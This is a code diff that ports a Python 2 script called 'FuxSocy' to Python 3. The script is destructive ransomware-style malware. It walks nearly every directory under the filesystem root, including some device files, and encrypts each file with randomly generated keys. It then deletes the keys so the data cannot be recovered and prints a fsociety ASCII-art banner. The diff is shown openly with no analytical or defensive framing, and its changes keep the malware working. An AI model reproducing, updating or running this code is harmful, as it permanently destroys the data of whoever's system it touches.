@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import os
 import subprocess
 import sys
@@ -22,12 +22,12 @@ def encrypt(filepath, key):
                 outfile.write(encryptor.encrypt(chunk))
 
 def load_entropy():
-    print "Loading Source of Entropy"
+    print("Loading Source of Entropy")
     source = os.urandom(256)
     for i in range(3):
       source += os.urandom(2 ** (21 + i))
       update_progress(((i + 1.0) / 3.0))
-    print "\n"
+    print("\n")
     return source
 
 def update_progress(progress):
@@ -42,17 +42,18 @@ def update_progress(progress):
     sys.stdout.flush()
 
 def generate_keys(source):
-    print "Generating Keys"
+    print("Generating Keys")
     keys = []
     for i in range(9):
-        keys.append(SHA256.new(''.join(SystemRandom().choice(source) for x in range(SystemRandom().randint(128, 256)) for x in range(SystemRandom().randint(128, 256)))).digest())
+        keys.append(SHA256.new(''.join(chr(SystemRandom().choice(source)) for _ in range(SystemRandom().randint(128, 256)) for _ in range(SystemRandom().randint(128, 256)))).digest())
         if i % 3 == 0:
             update_progress(((i + 1.0) / 3.0))
-    print "\n"
+    print("\n")
     return keys
 
+
 def locate_files():
-    print "Locating target files."
+    print("Locating target files.")
     targets = next(os.walk('/'))[1]
     for core in ('proc', 'sys', 'lib', 'run'):
         targets.remove(core)
@@ -70,7 +71,7 @@ def encrypt_dir(directory, key):
                 if '/dev' in path[:4]:
                     if not any(substring in path for substring in ('sg', 'fd', 'char', 'by-u', 'pts', 'cpu', 'mapper', 'input', 'bus', 'disk')):
                         if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq', 'timer', '-', ':', 'disk', 'block', 'char')):
-                            encrypt(path, key)
+                                                        encrypt(path, key)
                 else:
                     encrypt(path, key)
             except:
@@ -84,17 +85,56 @@ def encrypt_dir(directory, key):
 def pwn():
     keys = generate_keys(load_entropy())
     dirs = locate_files()
-    print "beginning crypto operations"
+    print("beginning crypto operations")
     for dir in sorted(dirs):
         directory = '/%s' % dir
-        print "Encrypting {}".format(directory)
+        print("Encrypting {}".format(directory))
         encrypt_dir(directory, key=SystemRandom().choice(keys))
     keys = None
     del keys
-    print "      __                _      _         \n     / _|              (_)    | |        \n    | |_ ___  ___   ___ _  ___| |_ _   _ \n    |  _/ __|/ _ \ / __| |/ _ \ __| | | |\n    | | \__ \ (_) | (__| |  __/ |_| |_| |\n    |_| |___/\___/ \___|_|\___|\__|\__, |\n                                    __/ |\n                                   |___/ \n\ncddddddddddddddddddddddddddddddddddddddddddd;\n0Mo..........':ldkO0KKXXKK0kxoc,..........kMd\n0Ml......;d0WMMMMMMMMMMMMMMMMMMMWKx:......kMd\n0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd\n0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd\n0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd\n0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd\n0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd\n0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd\n0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd\n0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd\n0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd\n0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd\n0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd\n0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd\n0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd\n0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd\n0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd\n0MMO.....................................WMMd\n0Mdkc...................................0kOMd\n0Ml.:Ol;........';;.......;,........':oX:.kMd\n0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd\n0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd\n0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd\n0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd\n0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd\n0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMNl......kMd\n0Ml........lXMMMMMMMMMMMMMMMMMMMKc........kMd\n0Ml..........:KMMMMMMMMMMMMMMM0,..........kMd\noO:............xOOOx:'';dOOOOd............lOc\n\n"
+    print("""      
+      __                _      _         
+     / _|              (_)    | |        
+    | |_ ___  ___   ___ _  ___| |_ _   _ 
+    |  _/ __|/ _ \ / __| |/ _ \ __| | | |
+    | | \__ \ (_) | (__| |  __/ |_| |_| |
+    |_| |___/\___/ \___|_|\___|\__|\__, |
+                                    __/ |
+                                   |___/ 
+
+cddddddddddddddddddddddddddddddddddddddddddd;
+0Mo..........':ldkO0KKXXKK0kxoc,..........kMd
+0Ml......;d0WMMMMMMMMMMMMMMMMMMMMMMMWKx:......kMd
+0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd
+0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd
+0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd
+0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd
+0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd
+0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd
+0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd
+0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd
+0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd
+0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd
+0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd
+0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd
+0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd
+0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd
+0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd
+0MMO.....................................WMMd
+0Mdkc...................................0kOMd
+0Ml.:Ol;........';;.......;,........':oX:.kMd
+0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd
+0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd
+0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd
+0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd
+0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd
+0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMMMMMNl......kMd
+0Ml........lXMMMMMMMMMMMMMMMMMMMMMMMKc........kMd
+0Ml..........:KMMMMMMMMMMMMMMMMMMM0,..........kMd
+oO:............xOOOx:'';dOOOOd............lOc\n\n""")
     exit(0)
 
 if __name__ == '__main__':
     subprocess.call('clear')
-    print "Executing FuxSocy"
+    print("Executing FuxSocy")
     pwn()
